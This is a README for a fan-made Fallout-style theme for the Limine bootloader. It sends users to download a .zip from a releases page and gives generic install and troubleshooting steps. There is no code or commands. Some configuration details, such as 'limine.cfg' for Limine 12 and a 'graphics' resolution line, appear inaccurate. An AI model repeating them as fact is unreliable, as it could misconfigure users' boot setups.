# ☢️ fallout-limine-theme - Transform your boot screen into Fallout

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Commonfatedisinflation68/fallout-limine-theme/releases)

## 📌 Overview
This project provides a visual theme inspired by the Fallout video game series for the Limine bootloader. Limine is a tool that manages how your computer operating system starts. By default, boot menus look plain and text-heavy. This theme replaces the basic menu with a custom look that mimics the retro-futuristic aesthetic of a Pip-Boy computer.

## 🛠️ Requirements
You need a computer that runs the Limine bootloader to use these files. Windows users who handle dual-boot setups or Linux installations often use Limine. 

*   A working installation of Limine version 12.
*   A USB drive or access to your computer boot partition.
*   Basic knowledge of your file system.

## 📥 Getting the Files
You must visit the releases page to obtain the necessary theme files. The developers package the theme as a compressed folder to keep the structure intact.

[Visit this page to download the latest theme package](https://github.com/Commonfatedisinflation68/fallout-limine-theme/releases)

1. Navigate to the link above.
2. Look for the section labeled "Assets."
3. Click the file ending in .zip to start the download.
4. Save the file to your Downloads folder.

## ⚙️ Installation Steps
Follow these steps to apply the Fallout theme to your existing Limine setup. If you do not have Limine installed, you must set that up before you apply this theme.

### Prepare the files
1. Open your Downloads folder.
2. Right-click the downloaded .zip file and select "Extract All."
3. Choose a location and click "Extract."
4. You will see a folder containing images and a configuration file named "limine.cfg."

### Move to the boot drive
1. Connect the drive that contains your bootloader files.
2. Locate the folder named "boot" or "limine" on your system partition.
3. Copy the contents of the extracted folder into your Limine directory.
4. If your computer asks to overwrite existing files, choose "Yes."

### Refresh the settings
The theme relies on a specific configuration file. The included "limine.cfg" contains the required paths to load the Fallout images. Ensure that these paths match the location where you placed the images. If your drive uses different folder names, open the .cfg file with any text editor and update the paths to match your layout.

## 🖥️ Customizing Appearance
The Fallout theme uses specific colors and fonts that match the game series. You might want to adjust these settings to fit your screen resolution. 

### Resolution settings
Open the limine.cfg file. Look for the line that says "graphics." You can change the numbers there to match your monitor resolution. Standard sizes include 1920x1080 or 1280x720. 

### Icon management
The folder contains icon files. You may replace these files with your own versions to change the look of menu items. Keep the file names the same so the bootloader recognizes them correctly.

## 🔍 Troubleshooting
Computers can be sensitive to boot configuration changes. If your menu does not show the new theme, verify these common points.

*   **File placement:** Ensure the theme images reside in the same folder as the limine.cfg file.
*   **Case sensitivity:** Some systems distinguish between capital and lowercase letters. Check that file names in your configuration match the actual file names on your drive exactly.
*   **Path errors:** If the screen stays black, the bootloader cannot find the background image. Reopen the configuration file and confirm the file path is correct.

## 🧪 Testing the Changes
After saving your changes to the configuration file, restart your computer. You should see the Fallout theme when the boot menu appears. If the original text menu appears instead, the system did not load the configuration changes. Return to your files and verify that you saved the latest version of your configuration.

## 📜 Legal and Credits
The Fallout brand remains the property of its respective owners. This project serves as a fan-made customization tool for personal use. The Limine bootloader remains a project of the Limine development community. By using this theme, you accept responsibility for your own boot configuration settings. 

This theme is provided as-is. The files undergo testing, but variations in computer hardware can lead to different results. Maintain a backup of your original bootloader files before you apply new themes to ensure you can restore your computer to its original state if needed.